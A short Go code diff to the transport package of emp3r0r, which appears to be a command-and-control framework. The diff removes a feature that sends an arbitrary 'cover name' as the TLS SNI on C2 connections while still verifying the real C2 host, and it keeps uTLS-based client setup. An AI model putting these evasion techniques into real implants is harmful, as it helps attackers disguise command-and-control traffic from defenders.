@@ -1,41 +1,17 @@
+//go:build !no_utls
+
 package transport
 
 import (
-	"context"
-	"net"
 	"net/http"
 	"net/url"
 	"strings"
-	"sync/atomic"
 	"time"
 
 	"github.com/jm33-m0/emp3r0r/core/lib/logging"
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
 	utls "github.com/refraction-networking/utls"
 )
-
-// c2ServerName stores the operator-configured SNI override for C2 TLS.
-var c2ServerName atomic.Value // string
-
-// SetC2ServerName sets the SNI presented on C2 TLS connections. An empty value
-// uses the C2 address host. The C2 TLS listener does not select a certificate
-// by SNI, so this can be an arbitrary cover name; the server certificate is
-// still verified against the real C2 host.
-func SetC2ServerName(name string) {
-	c2ServerName.Store(strings.TrimSpace(name))
-}
-
-// c2ServerNames returns the SNI to send and the name to verify the server
-// certificate against. Without an override both are the C2 host, which also
-// lets crypto/tls omit SNI for IP literals.
-func c2ServerNames(c2Host string) (sni, verifyName string) {
-	if custom, _ := c2ServerName.Load().(string); custom != "" {
-		return custom, c2Host
-	}
-	return c2Host, ""
-}
-
-var GlobalMeshDialer func(ctx context.Context, network, addr string) (net.Conn, error)
 
 // CreateEmp3r0rHTTPClient add our CA to trusted CAs, while keeps TLS InsecureVerify on
 // c2_addr: C2 address, only the hostname will be used
